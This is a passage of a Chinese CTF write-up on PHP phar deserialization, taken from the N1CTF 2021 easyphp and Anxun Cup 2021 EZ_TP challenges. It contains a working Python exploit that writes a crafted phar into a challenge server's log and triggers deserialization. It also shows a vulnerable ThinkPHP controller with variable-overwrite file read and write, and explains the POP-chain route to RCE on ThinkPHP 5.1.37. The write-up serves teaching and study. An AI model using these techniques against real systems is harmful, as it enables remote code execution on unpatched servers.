class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; rq&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; json &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; random&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ip = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;here_is_remote_ip&amp;gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;generate_random_str&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;randomlength=&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;  生成一个指定长度的随机字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;  &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  random_str = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  base_str = &lt;span class=&#34;string&#34;&gt;&amp;#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  length = &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(base_str) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(randomlength):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    random_str += base_str[random.randint(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, length)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; random_str&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;new_one&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;offset&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rd = generate_random_str(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ts2 = time.strftime(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%Y-%m-%d %H:%M:%S&amp;#x27;&lt;/span&gt;,time.localtime(time.time()+offset))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ts = time.strftime(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%Y-%m-%d %H:%M:%S&amp;#x27;&lt;/span&gt;,time.localtime(time.time()))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res = rq.get(url=&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://127.0.0.1/test.php?sb=&lt;span class=&#34;subst&#34;&gt;&amp;#123;rd&amp;#125;&lt;/span&gt;&amp;amp;ts=&lt;span class=&#34;subst&#34;&gt;&amp;#123;ts2&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 访问本地生成phar&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;rd&amp;#125;&lt;/span&gt;.phar.tar&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        data = f.read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = data[&lt;span class=&#34;number&#34;&gt;70&lt;/span&gt;::]&lt;span class=&#34;comment&#34;&gt;#去掉前面的冗余部分以便和log前面拼接形成合法*.phar.tar&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    headers = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;content-type&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;application/x-www-form&amp;#x27;&lt;/span&gt;&amp;#125;  &lt;span class=&#34;comment&#34;&gt;# 源文本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res = rq.post(url=&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://43.155.59.185:53340/log.php?log_type=&lt;span class=&#34;subst&#34;&gt;&amp;#123;rd&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;,data=data)  &lt;span class=&#34;comment&#34;&gt;# 写入日志&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res = rq.post(url=&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://43.155.59.185:53340?file=phar://./log/&lt;span class=&#34;subst&#34;&gt;&amp;#123;ip&amp;#125;&lt;/span&gt;/&lt;span class=&#34;subst&#34;&gt;&amp;#123;rd&amp;#125;&lt;/span&gt;_www.log&amp;quot;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 反序列化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(res.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(-&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#考虑本地和远程的时间差异，这边设置个30s的窗口期&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    new_one(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    time.sleep(&lt;span class=&#34;number&#34;&gt;0.9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;生成的文件长这样（看个开头就行）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000010: 2030 363a 3533 3a31 3520 4950 3a20 5b5d   06:53:15 IP: []&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;不只是tar，还有别的格式：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/targz.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;&lt;a href=&#34;https://www.php.net/manual/zh/phar.converttoexecutable.php&#34;&gt;https://www.php.net/manual/zh/phar.converttoexecutable.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对应的代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;convertToExecutable&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;TAR&lt;/span&gt;,&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;BZ2&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//会生成xxxx.phar.tar.bz2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;convertToExecutable&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;TAR&lt;/span&gt;,&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;GZ&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//会生成xxxx.phar.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;convertToExecutable&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;ZIP&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//会生成xxxx.phar.zip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h3 id=&#34;POP链&#34;&gt;&lt;a href=&#34;#POP链&#34; class=&#34;headerlink&#34; title=&#34;POP链&#34;&gt;&lt;/a&gt;&lt;strong&gt;POP链&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;POP(property oriented programming)，说白了就是经过一连串的魔术方法&amp;#x2F;特殊方法调用达到特定目的的一种攻击方式，本质是通过在调用这些方法的过程中又触发了别的特殊方法，引发连锁反应直到触及目标。phar反序列化使得不存在unserilize函数时这样的攻击也能成功，这正是所谓“扩大攻击面”。我们以刚刚结束的安洵杯2021 EZ_TP为例子。&lt;/p&gt;
&lt;p&gt;网站使用ThinkPHP V5.1.37，网上已有现成的&lt;a href=&#34;https://blog.csdn.net/lllffg/article/details/116145918&#34;&gt;POP链&lt;/a&gt;，现在需要我们在没有unserilize函数的情况下完成反序列化攻击。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;app&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;index&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;controller&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title&#34;&gt;Controller&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Index&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;controller&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;index&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;*&amp;#123; padding: 0; margin: 0; &amp;#125; div&amp;#123; padding: 4px 48px;&amp;#125; a&amp;#123;color:#2E5CD5;cursor: pointer;text-decoration: none&amp;#125; a:hover&amp;#123;text-decoration:underline; &amp;#125; body&amp;#123; background: #fff; font-family: &amp;quot;Century Gothic&amp;quot;,&amp;quot;Microsoft yahei&amp;quot;; color: #333;font-size:18px;&amp;#125; h1&amp;#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &amp;#125; p&amp;#123; line-height: 1.6em; font-size: 42px &amp;#125;&amp;lt;/style&amp;gt;&amp;lt;div style=&amp;quot;padding: 24px 48px;&amp;quot;&amp;gt; &amp;lt;h1&amp;gt;:) &amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt; ThinkPHP V5.1&amp;lt;br/&amp;gt;&amp;lt;span style=&amp;quot;font-size:30px&amp;quot;&amp;gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;https://tajs.qq.com/stats?sId=64890268&amp;quot; charset=&amp;quot;UTF-8&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;https://e.topthink.com/Public/static/client.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;think id=&amp;quot;eab4b9f840753f8e7&amp;quot;&amp;gt;&amp;lt;/think&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;hello&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$hello&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;base64_encode&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Welcome to D0g3&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;])||&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;])) &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;world&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;parse_str&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;world&amp;#x27;&lt;/span&gt;],&lt;span class=&#34;variable&#34;&gt;$haha&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;extract&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$haha&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;hello.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;base64_decode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$hello&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello.txt&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;parse_str()和extract()使得我们可以通过变量覆盖完成文件写入与任意读取，并且$a可以使用伪协议。那么接下来的事情就理所应当了：往hello.txt里写入一个phar，metadata里面放ThinkPHP 5.1.37 的反序列化利用链，完成RCE.(关于这个POP链的原理请参阅&lt;a href=&#34;https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html&#34;&gt;https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-反序列化漏洞/Thinkphp-5.1.37-反序列化漏洞.html&lt;/a&gt; 讲的很详细)&lt;/p&gt;
